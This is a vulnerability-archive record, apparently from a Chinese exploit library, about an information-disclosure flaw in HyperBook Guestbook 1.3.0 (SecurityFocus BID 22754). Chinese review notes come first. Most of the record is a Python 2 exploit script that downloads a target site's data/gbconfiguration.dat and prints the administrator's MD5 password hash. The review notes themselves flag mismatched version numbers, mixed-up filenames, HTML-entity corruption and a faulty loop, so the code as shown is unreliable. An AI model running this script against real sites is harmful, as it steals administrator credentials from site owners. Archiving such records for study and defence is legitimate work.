---
source: "白阁文库 BaizeSec/bylibrary"
product: "HyperBook Guestbook1.3.0"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "HyperBook Guestbook 1.3 GBConfiguration.DAT Hashed Password信息泄露漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：data/gbconfiguration.dat可公开读取；脚本假设文件结构与路径字符串匹配"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-50a1e4bf9b9b22da79e951ba"
entity_id: "ve-50a1e4bf9b9b22da79e951ba"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：data/gbconfiguration.dat可公开读取；脚本假设文件结构与路径字符串匹配

- **事实待核（1）**：标题1.3、说明1.3.0、脚本1.30需统一历史版本；gb/qbconfiguration文件名混写。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **结论使用边界（2）**：Python2代码未围栏且保留&amp;#34;/&amp;#39;实体不能直接运行。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **结论使用边界（3）**：while用字符与整数1比较无终止作用，依赖两个换行否则越界；查找path失败未处理；SecurityFocus BID22754是有用原始线索。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# HyperBook Guestbook 1.3 GBConfiguration.DAT Hashed Password信息泄露漏洞

source: http://www.securityfocus.com/bid/22754/info

HyperBook Guestbook is prone to an information-disclosure vulnerability because the application fails to protect sensitive information.

An attacker can exploit this issue to access sensitive information that may lead to other attacks.

This issue affects version 1.3.0; other versions may also be affected.

#!/usr/bin/python
#Script                  :HyperBook Guestbook v1.30 (qbconfiguration.dat) Remote Admin md5 Hash Exploit
#Exploit Coded by        : PeTrO
#Exploit Discovered by   : SaO [www.saohackstyle.com]
#Credits to              :[soulreaver],Kuzey
 

import urllib
import sys
import parser

serv=&#34;http://&#34;
i=0
for arg in sys.argv:
     i=i+1

if i!=3:
 print &#34;&#34;&#34;\n\n
         \tHyperBook Guestbook v1.30  (qbconfiguration.dat) 
         \t\t    Remote Admin md5 Hash Exploit 
          \t                            
          \tUsage:Exploit.py [targetsite] [path] 
          \tExample:Exploit.py www.target.com /guestbook/\n\n&#34;&#34;&#34;
else:
    

    adres=sys.argv[1]
    path=sys.argv[2]

    str1=adres.join([serv,path])
    str2=str1.join([&#39;&#39;,&#39;data/gbconfiguration.dat&#39;])

    print &#34;\n[~]Connecting...&#34;
    url=urllib.urlopen(str2).read(); 
    print &#34;\n[+]Connected!&#34;
 
    test=url.find(path);

    t=0;
    print &#34;\n\t\t\t-=[Admin md5 hash]=-&#34;
    while(url[test+1]!=1): #parsing hash... by PeTrO..
              print url[test],

              if(url[test]==&#39;\n&#39;):
                 t=t+1;  

              if(t==2):
                 break;
                
              test=test+1;

    print &#34;\n\n\t\t\t[ c0ded by PeTrO ]&#34;


---

> 来源：白阁文库 BaizeSec/bylibrary
